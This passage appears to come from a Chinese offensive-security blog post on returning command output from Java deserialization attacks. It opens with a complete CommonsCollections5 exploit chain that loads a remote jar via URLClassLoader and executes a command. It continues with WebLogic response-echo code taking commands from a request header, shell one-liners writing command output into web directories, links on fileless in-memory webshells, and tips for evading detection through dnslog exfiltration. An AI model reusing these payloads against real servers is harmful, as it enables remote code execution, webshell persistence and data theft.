    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import javax.management.BadAttributeValueExpException;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.net.URL;
    import java.net.URLClassLoader;
    import java.util.HashMap;
    import java.util.Map;
    class CommonsCollections5URLClassLoader {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(URLClassLoader.class),
                    // 获取构造方法
                    new InvokerTransformer("getConstructor",
                            new Class[]{Class[].class},
                            new Object[]{new Class[]{java.net.URL[].class}}),
                    // new实例并赋值url
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new URL[]{new URL("http://127.0.0.1/p.jar")}}}),
                    // loadClass加载ProcessExec
                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{"ProcessExec"}),
                    // 获取ProcessExec的构造方法
                    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
                    // 实例化ProcessExec
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{"ipconfig"}})
            };
            Transformer chain = new ChainedTransformer(transformers);
            Map map = new HashMap();
            Map lazyMap = LazyMap.decorate(map, chain);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, "");
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(entry);
            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException, entry);
            serialize(badAttributeValueExpException);
            deserialize();
        }
        public static void serialize(Object obj) {
            try {
                ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
                os.writeObject(obj);
                os.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void deserialize() {
            try {
                ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
                is.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
这个例子大多出现在jboss和fastjson中，灵活使用。
## 中间件回显
中间件而言多数重写了thread类，在thread中保存了req和resp，可以通过获取当前线程，在resp中写入回显结果
这种方法前几天在先知上有很多针对tomcat无回显的文章，为各位师傅的文章画一下时间线：
  1. [《基于内存 Webshell 的无文件攻击技术研究》](https://www.anquanke.com/post/id/198886) 主要应用于Spring
  2. [《linux下java反序列化通杀回显方法的低配版实现》](https://xz.aliyun.com/t/7307) 将回显结果写入文件操作符
  3. [《Tomcat中一种半通用回显方法》](https://xz.aliyun.com/t/7348) 将执行命令的结果存入tomcat的response返回 shiro无法回显
  4. [《基于tomcat的内存 Webshell 无文件攻击技术》](https://xz.aliyun.com/t/7388) 动态注册filter实现回显 shiro无法回显
  5. [《基于全局储存的新思路 | Tomcat的一种通用回显方法研究》](https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3) 通过Thread.currentThread.getContextClassLoader() 拿到request、response回显 tomcat7中获取不到StandardContext
  6. [《tomcat不出网回显连续剧第六集》](https://xz.aliyun.com/t/7535) 直接从Register拿到process对应的req
不再赘述了，具体实现文章都有了。值得一提的思路可能就是反序列化不仅仅可以回显，也可以配合反射和字节码动态注册servlet实现内存webshell。
在weblogic中也有resp回显，具体代码在
[《weblogic_2019_2725poc与回显构造》](https://xz.aliyun.com/t/5299) lufei师傅已经给出来了
weblogic10.3.6
    String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader("lfcmd");
    weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();
    weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();
    outputStream.writeStream(new weblogic.xml.util.StringInputStream(lfcmd));
    outputStream.flush();
    response.getWriter().write("");
weblogic12.1.3
    java.lang.reflect.Field field = ((weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor)this.getCurrentWork()).getClass().getDeclaredField("connectionHandler");
    field.setAccessible(true);
    HttpConnectionHandler httpConn = (HttpConnectionHandler) field.get(this.getCurrentWork());
    httpConn.getServletRequest().getResponse().getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream("xxxxxx"));
## 写文件
通过搜索特殊文件路径直接写入web可访问的目录，要熟悉常用中间件容器的目录结构，比如在我web目录有一个特殊的test.html
linux用bash
    // 进入test.html的根目录并执行id命令写入1.txt
    cd $(find -name "test.html" -type f -exec dirname {} \; | sed 1q) && echo `id` > 1.txt
windows的powershell
    $file = Get-ChildItem -Path . -Filter test.html -recurse -ErrorAction SilentlyContinue;$f = -Join($file.DirectoryName,"/a.txt");echo 222 |Out-File $f
## dnslog
这个就不提了，技巧的话就是用powershell或者base64命令编码一下，避免特殊字符，还有就是挑小众的dnslog平台。
## 参考
  1. 
  2. 
  3. 
  4. 